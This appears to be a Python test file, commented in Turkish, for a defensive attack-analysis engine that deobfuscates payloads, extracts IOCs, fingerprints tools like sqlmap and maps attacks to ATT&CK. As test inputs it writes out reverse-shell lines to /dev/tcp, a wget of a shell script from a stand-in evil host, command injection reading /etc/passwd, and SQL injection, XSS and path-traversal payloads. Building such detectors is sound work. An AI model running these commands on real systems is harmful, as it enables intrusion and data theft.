"""Faz 5 - Saldiri tersine muhendislik motoru testleri."""
import base64
import urllib.parse

from arachne.reverse import deobfuscator, ioc_extractor, tool_fingerprint
from arachne.reverse.attack_analyzer import analyze_ip, analyze_payload


# --- Deobfuscator ----------------------------------------------------------

def test_deobfuscate_plain_text_is_unchanged():
    result = deobfuscator.deobfuscate("merhaba dunya")
    assert result.decoded == "merhaba dunya"
    assert result.was_obfuscated is False
    assert result.layers == 0


def test_deobfuscate_single_url_layer():
    original = "' OR '1'='1"
    encoded = urllib.parse.quote(original)
    result = deobfuscator.deobfuscate(encoded)
    assert result.decoded == original
    assert result.layers == 1
    assert result.steps[0].method == "url"


def test_deobfuscate_double_url_encoding():
    """Cift URL kodlama klasik bir WAF atlatma teknigidir."""
    original = "../../etc/passwd"
    once = urllib.parse.quote(original, safe="")
    twice = urllib.parse.quote(once, safe="")
    result = deobfuscator.deobfuscate(twice)
    assert result.decoded == original
    assert result.layers == 2


def test_deobfuscate_base64_layer():
    original = "cat /etc/passwd"
    encoded = base64.b64encode(original.encode()).decode()
    result = deobfuscator.deobfuscate(encoded)
    assert result.decoded == original
    assert any(s.method == "base64" for s in result.steps)


def test_deobfuscate_base64_inside_url_encoding():
    """Cok katmanli gercekci senaryo: base64 -> URL kodlama.

    Padding ('=') iceren bir base64 secildi ki URL kodlamasi gercekten
    bir sey degistirsin (%3D) - aksi halde iki katman ayirt edilemez."""
    original = "; cat /etc/passwd && whoami!"
    b64 = base64.b64encode(original.encode()).decode()
    assert "=" in b64, "test onkosulu: base64 ciktisi padding icermeli"
    wrapped = urllib.parse.quote(b64, safe="")
    result = deobfuscator.deobfuscate(wrapped)
    assert result.decoded == original
    assert result.layers >= 2


def test_deobfuscate_html_entities():
    result = deobfuscator.deobfuscate("&lt;script&gt;alert(1)&lt;/script&gt;")
    assert "<script>" in result.decoded


def test_deobfuscate_hex_escapes():
    result = deobfuscator.deobfuscate(r"\x63\x61\x74\x20\x2f\x65\x74\x63")
    assert "cat /etc" in result.decoded


def test_deobfuscate_never_exceeds_max_depth():
    """Sonsuz donguye karsi koruma: derinlik siniri her zaman uygulanir."""
    payload = "a b c"
    for _ in range(20):
        payload = urllib.parse.quote(payload, safe="")
    result = deobfuscator.deobfuscate(payload, max_depth=3)
    assert result.layers <= 3


def test_deobfuscate_rejects_binary_base64():
    """Base64 cozumu binary uretiyorsa kabul edilmemeli (yanlis pozitif onleme)."""
    binary_b64 = base64.b64encode(bytes(range(0, 32)) * 2).decode()
    result = deobfuscator.deobfuscate(binary_b64)
    assert not any(s.method == "base64" for s in result.steps)


def test_obfuscation_score_increases_with_layers():
    plain = deobfuscator.deobfuscate("merhaba")
    encoded = urllib.parse.quote(urllib.parse.quote("' OR 1=1", safe=""), safe="")
    layered = deobfuscator.deobfuscate(encoded)
    assert deobfuscator.obfuscation_score(plain) == 0
    assert deobfuscator.obfuscation_score(layered) > 0


# --- IOC cikarici -----------------------------------------------------------

def test_extract_iocs_finds_ip_and_url():
    text = "wget http://evil.example.com/shell.sh from 203.0.113.45"
    iocs = ioc_extractor.extract_iocs(text)
    assert "203.0.113.45" in iocs["ipv4"]
    assert any("evil.example.com" in u for u in iocs["urls"])
    assert "wget" in iocs["shell_commands"]


def test_extract_iocs_detects_reverse_shell():
    text = "bash -i >& /dev/tcp/10.0.0.5/4444 0>&1"
    iocs = ioc_extractor.extract_iocs(text)
    assert iocs["reverse_shells"]
    assert "10.0.0.5" in iocs["ipv4"]


def test_extract_iocs_finds_unix_paths():
    iocs = ioc_extractor.extract_iocs("include=../../../etc/passwd")
    assert any("/etc/passwd" in p for p in iocs["unix_paths"])


def test_extract_iocs_empty_input_returns_all_keys():
    """Bos girdide bile tum anahtarlar bulunmali (ongorulebilir sema)."""
    iocs = ioc_extractor.extract_iocs("")
    for key in ("ipv4", "urls", "domains", "shell_commands", "reverse_shells"):
        assert key in iocs
        assert iocs[key] == []


def test_classify_ip_distinguishes_scopes():
    assert ioc_extractor.classify_ip("127.0.0.1") == "loopback"
    assert ioc_extractor.classify_ip("192.168.1.5") == "private"
    assert ioc_extractor.classify_ip("8.8.8.8") == "public"
    assert ioc_extractor.classify_ip("not-an-ip") == "invalid"


def test_classify_ip_separates_rfc5737_documentation_range():
    """RFC 5737 adresleri Python'da 'private' gorunur; biz ayirt ediyoruz.

    Bu ayrim onemli: dokumantasyon adresleri gercek bir cihaza ait olamaz,
    dolayisiyla senaryo trafiginde guvenle kullanilabilir ve SOAR onlari
    gercekten engelleyebilir."""
    for ip in ("203.0.113.45", "192.0.2.10", "198.51.100.7"):
        assert ioc_extractor.classify_ip(ip) == "documentation"


# --- Arac parmak izi --------------------------------------------------------

def test_fingerprint_detects_sqlmap_user_agent():
    matches = tool_fingerprint.fingerprint_tool(
        "GET /?id=1 HTTP/1.1\r\nUser-Agent: sqlmap/1.7.2#stable (http://sqlmap.org)"
    )
    assert matches
    assert matches[0].tool == "sqlmap"
    assert matches[0].confidence >= 90


def test_fingerprint_detects_time_based_blind_sqli():
    matches = tool_fingerprint.fingerprint_tool("id=1 AND SLEEP(5)")
    assert any(m.tool == "sqlmap" for m in matches)


def test_fingerprint_gobuster_maps_to_wordlist_scanning_not_brute_force():
    """MITRE dogrulugu: dizin brute-force T1595.003'tur, T1110 DEGIL."""
    matches = tool_fingerprint.fingerprint_tool("User-Agent: gobuster/3.6")
    gobuster = next(m for m in matches if m.tool == "gobuster")
    assert "T1595.003" in gobuster.attck_techniques
    assert "T1110" not in gobuster.attck_techniques


def test_fingerprint_returns_empty_for_benign_traffic():
    assert tool_fingerprint.fingerprint_tool("GET /index.html HTTP/1.1") == []


def test_is_automated_true_for_known_tool():
    assert tool_fingerprint.is_automated("User-Agent: Nikto/2.5.0") is True
    assert tool_fingerprint.is_automated("normal istek") is False


# --- Analiz orkestratoru ----------------------------------------------------

def test_analyze_payload_detects_sqli_and_maps_to_attck():
    result = analyze_payload("username=' OR '1'='1' --")
    assert "SQL Injection" in result["attack_classes"]
    assert any(t["id"] == "T1190" for t in result["attck_techniques"])
    assert result["threat_score"] > 0
    # CWE eslemesi de yapilmali (ATT&CK tek basina SQLi icin yeterli degil)
    cwes = [c for m in result["framework_mappings"] for c in m["cwe"]]
    assert "CWE-89" in cwes


def test_analyze_payload_finds_attack_hidden_under_encoding():
    """Faz 5'in en onemli yetenegi: kodlama altina gizlenmis saldiriyi bulmak."""
    hidden = urllib.parse.quote(base64.b64encode(b"' OR '1'='1").decode(), safe="")
    result = analyze_payload(hidden)
    assert "SQL Injection" in result["attack_classes"]
    assert "SQL Injection" in result["hidden_attack_classes"]
    assert result["deobfuscation"]["was_obfuscated"] is True


def test_analyze_payload_clean_input_has_zero_score():
    result = analyze_payload("GET /anasayfa HTTP/1.1")
    assert result["attack_classes"] == []
    assert result["threat_score"] == 0
    assert result["verdict"] == "temiz"


def test_analyze_payload_reverse_shell_is_critical():
    result = analyze_payload("bash -i >& /dev/tcp/198.51.100.7/4444 0>&1")
    assert "Reverse Shell" in result["attack_classes"]
    assert result["threat_score"] >= 55


def test_analyze_ip_reconstructs_attack_chain():
    events = [
        {"id": 1, "timestamp": "2026-08-14 10:00:00", "service": "ssh",
         "event_type": "connect", "payload": None},
        {"id": 2, "timestamp": "2026-08-14 10:00:05", "service": "http-admin",
         "event_type": "data", "payload": "id=1' OR '1'='1"},
        {"id": 3, "timestamp": "2026-08-14 10:00:09", "service": "http-admin",
         "event_type": "data", "payload": "cmd=; cat /etc/passwd"},
    ]
    result = analyze_ip("203.0.113.9", events)
    assert result["event_count"] == 3
    assert "SQL Injection" in result["attack_classes"]
    assert "Command Injection" in result["attack_classes"]
    # Komut enjeksiyonu kill chain'de somuru/kurulum asamasina tasir
    assert result["kill_chain"]["stage_index"] >= 4
    assert result["max_threat_score"] > 0


def test_analyze_ip_handles_events_without_payload():
    events = [{"id": 1, "timestamp": "2026-08-14 10:00:00", "service": "ssh",
               "event_type": "connect", "payload": None}]
    result = analyze_ip("203.0.113.10", events)
    assert result["analyzed_payloads"] == 0
    assert result["event_count"] == 1


def test_classic_unquoted_or_1_equals_1_is_detected():
    """Faz 5 sirasinda bulunan gercek tespit acigini korur.

    Ilk imza setinde yalnizca tirnakli varyant (' or '1'='1) vardi;
    en yaygin kaliplardan biri olan tirnaksiz `' OR 1=1--` hic
    yakalanmiyordu."""
    result = analyze_payload("id=1' OR 1=1--")
    assert "SQL Injection" in result["attack_classes"]
    assert result["threat_score"] > 0


def test_expanded_signatures_catch_common_variants():
    variants = [
        "id=1 UNION ALL SELECT NULL,NULL--",
        "id=1' AND SLEEP(5)--",
        "user=admin'--",
        "?q=1 AND 1=1 UNION SELECT table_name FROM information_schema.tables",
    ]
    for payload in variants:
        result = analyze_payload(payload)
        assert "SQL Injection" in result["attack_classes"], f"kacirildi: {payload}"


def test_expanded_signatures_do_not_flag_benign_traffic():
    """Yanlis pozitif kontrolu: genisletilmis imzalar normal trafigi
    isaretlememeli."""
    benign = [
        "GET /index.html HTTP/1.1",
        "username=emir&password=parola123",
        "search=kirmizi ayakkabi",
        "GET /urunler?kategori=elektronik&sayfa=2 HTTP/1.1",
        "POST /api/siparis {\"urun_id\": 42, \"adet\": 1}",
    ]
    for payload in benign:
        result = analyze_payload(payload)
        assert result["attack_classes"] == [], f"yanlis pozitif: {payload}"


def test_xss_variants_detected():
    for payload in ['<img src=x onerror=alert(1)>', '<svg onload=alert(1)>',
                     'javascript:document.cookie']:
        result = analyze_payload(payload)
        assert "XSS" in result["attack_classes"], f"kacirildi: {payload}"


def test_path_traversal_encoded_variants_detected():
    for payload in ["file=..%2f..%2f..%2fetc%2fpasswd", "file=....//....//etc/passwd"]:
        result = analyze_payload(payload)
        assert result["attack_classes"], f"kacirildi: {payload}"
